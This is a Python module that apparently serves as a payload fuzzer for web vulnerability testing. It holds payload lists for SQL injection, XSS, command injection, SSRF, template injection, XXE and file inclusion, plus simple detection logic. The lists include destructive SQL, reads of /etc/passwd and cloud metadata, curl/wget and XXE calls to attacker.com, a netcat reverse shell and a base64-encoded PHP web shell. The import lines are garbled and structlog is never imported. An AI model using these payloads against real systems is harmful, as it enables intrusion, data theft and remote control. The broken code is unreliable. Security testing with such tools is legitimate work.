"""
InjectX-Style Payload Fuzzer

Advanced payload library and fuzzing engine for vulnerability testing:
- SQL injection payloads
- XSS vectors
- Command injection
- SSRF payloads
- Template injection
- XXE payloads
"""

from typing import List, Dict, Any
import struct

log

logger = structlog.get_logger()


class PayloadFuzzer:
    """
    Advanced payload fuzzing system inspired by InjectX
    """

    # Payload libraries organized by attack type
    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "UNION SELECT NULL--",
        "UNION ALL SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT version()--",
        "'; DROP TABLE users--",
        "'; EXEC xp_cmdshell('dir')--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
        "' AND 1=CONVERT(int, (SELECT @@version))--"
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=\"javascript:alert('XSS')\">",
        "<IMG SRC=JaVaScRiPt:alert('XSS')>",
        "<IMG SRC=`javascript:alert('XSS')`>",
        "<IMG \"\"\"><SCRIPT>alert('XSS')</SCRIPT>\">",
        "<IMG SRC=/ onerror=\"alert('XSS')\">",
        "<img src=x:alert('XSS') onerror=eval(src)>"
    ]

    COMMAND_INJECTION = [
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "`ls`",
        "$(ls)",
        "; whoami",
        "| whoami",
        "& whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "; ping -c 4 127.0.0.1",
        "| ping -c 4 127.0.0.1",
        "; curl http://attacker.com",
        "| curl http://attacker.com",
        "; wget http://attacker.com",
        "| wget http://attacker.com",
        "; nc -e /bin/sh 127.0.0.1 4444",
        "`nc -e /bin/sh 127.0.0.1 4444`"
    ]

    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://0.0.0.0",
        "http://169.254.169.254",  # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:11211/stat",
        "gopher://127.0.0.1:6379/_INFO",
        "http://0177.0.0.1",  # Octal IP
        "http://0x7f.0.0.1",  # Hex IP
        "http://2130706433",  # Decimal IP
        "http://localhost@169.254.169.254"
    ]

    TEMPLATE_INJECTION = [
        "{{7*7}}",
        "${7*7}",
        "{{config}}",
        "{{config.items()}}",
        "{{get_flashed_messages.__globals__}}",
        "{{request.application.__globals__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.class.mro()[1].__subclasses__()}}",
        "{{config.__class__.__init__.__globals__}}",
        "${{7*7}}",
        "#{{7*7}}",
        "*{7*7}",
        "@{7*7}",
        "{{7*'7'}}",
        "{{''.__class__}}",
        "{{''.__class__.__base__}}"
    ]

    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>'
    ]

    LFI_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....\/....\/....\/etc\/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
    ]

    def __init__(self):
        self.payload_libraries = {
            'sql_injection': self.SQL_INJECTION,
            'xss': self.XSS_PAYLOADS,
            'command_injection': self.COMMAND_INJECTION,
            'ssrf': self.SSRF_PAYLOADS,
            'template_injection': self.TEMPLATE_INJECTION,
            'xxe': self.XXE_PAYLOADS,
            'lfi': self.LFI_PAYLOADS
        }

        logger.info("PayloadFuzzer initialized", total_payloads=sum(len(v) for v in self.payload_libraries.values()))

    def get_payloads(self, attack_type: str = None) -> List[str]:
        """
        Get payloads for specific attack type or all

        Args:
            attack_type: Type of attack (sql_injection, xss, etc.) or None for all

        Returns:
            List of payloads
        """
        if attack_type:
            return self.payload_libraries.get(attack_type, [])

        # Return all payloads
        all_payloads = []
        for payloads in self.payload_libraries.values():
            all_payloads.extend(payloads)

        return all_payloads

    def fuzz_parameter(
        self,
        param_name: str,
        param_value: str,
        attack_types: List[str] = None
    ) -> List[Dict[str, Any]]:
        """
        Generate fuzzing test cases for a parameter

        Args:
            param_name: Parameter name
            param_value: Original parameter value
            attack_types: List of attack types to test (None for all)

        Returns:
            List of test cases with payloads
        """
        test_cases = []

        if attack_types is None:
            attack_types = list(self.payload_libraries.keys())

        for attack_type in attack_types:
            payloads = self.get_payloads(attack_type)

            for payload in payloads:
                test_case = {
                    'param_name': param_name,
                    'original_value': param_value,
                    'payload': payload,
                    'attack_type': attack_type,
                    'test_value': payload  # In advanced version, blend with original value
                }

                test_cases.append(test_case)

        logger.info(f"Generated {len(test_cases)} fuzzing test cases for parameter '{param_name}'")

        return test_cases

    def detect_vulnerability(
        self,
        response_text: str,
        attack_type: str,
        payload: str
    ) -> Dict[str, Any]:
        """
        Detect if a vulnerability was successfully exploited

        Args:
            response_text: Response from the application
            attack_type: Type of attack that was tested
            payload: Payload that was used

        Returns:
            Detection result
        """
        result = {
            'vulnerable': False,
            'attack_type': attack_type,
            'payload': payload,
            'confidence': 0.0,
            'evidence': []
        }

        response_lower = response_text.lower()

        # SQL Injection indicators
        if attack_type == 'sql_injection':
            sql_errors = [
                'sql syntax', 'mysql_fetch', 'mysql_num_rows', 'mysqli',
                'postgresql', 'oracle', 'sqlite', 'odbc', 'jdbc',
                'unclosed quotation', 'quoted string not properly terminated',
                'syntax error', 'unterminated string'
            ]

            for error in sql_errors:
                if error in response_lower:
                    result['vulnerable'] = True
                    result['confidence'] = 0.9
                    result['evidence'].append(f"SQL error detected: {error}")

        # XSS indicators
        elif attack_type == 'xss':
            if payload.lower() in response_lower:
                result['vulnerable'] = True
                result['confidence'] = 0.8
                result['evidence'].append("Payload reflected in response")

            # Check for unencoded script tags
            if '<script>' in response_lower and 'alert' in response_lower:
                result['vulnerable'] = True
                result['confidence'] = 0.95
                result['evidence'].append("Unencoded script tag in response")

        # Command Injection indicators
        elif attack_type == 'command_injection':
            cmd_outputs = [
                'root:', 'bin/bash', 'uid=', 'gid=',
                'volume serial number', 'directory of'
            ]

            for output in cmd_outputs:
                if output in response_lower:
                    result['vulnerable'] = True
                    result['confidence'] = 0.95
                    result['evidence'].append(f"Command output detected: {output}")

        # SSRF indicators
        elif attack_type == 'ssrf':
            if 'ami-id' in response_lower or 'instance-id' in response_lower:
                result['vulnerable'] = True
                result['confidence'] = 1.0
                result['evidence'].append("AWS metadata exposed")

        # Template Injection indicators
        elif attack_type == 'template_injection':
            if '49' in response_text and '7*7' in payload:
                result['vulnerable'] = True
                result['confidence'] = 0.9
                result['evidence'].append("Template expression evaluated")

        return result


# Global instance
payload_fuzzer = PayloadFuzzer()
